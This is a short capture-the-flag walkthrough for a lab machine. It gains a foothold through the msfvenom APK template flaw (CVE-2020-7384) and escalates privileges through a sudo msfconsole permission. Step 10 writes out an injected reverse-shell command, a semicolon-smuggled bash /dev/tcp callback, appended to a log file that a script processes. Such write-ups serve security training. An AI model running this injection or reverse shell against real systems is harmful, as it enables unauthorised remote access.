## Initial Foothold

1. Nmap scan gave two available ports. 22 and 5000
2. Add 10.10.10.226 to /etc/hosts
3. Visiting site, we can see nmap, msfvenom and searchsploit toolkit present.
4. The foothold is the android apk template selection. CVE-2020-7384.
5. search in msfconsole. Set parameters. In the site set LHOST as your own IP on tun0.
6. Open a listener and generate the payload.
7. User text is present there.

## Priv Escalation
8. We can see in /home/pwn/scanlosers.sh that /home/kid/logs/hacker is exec. 
9. We have the permission to input in hackers file. 
10. echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.207/1337 0>&1' #" >> hackers
11. Open a listener on local host, we get a shell of pwn.
12. sudo -l gives msfconsole can run without root.
13. run msfconsole and then read /root/root.txt

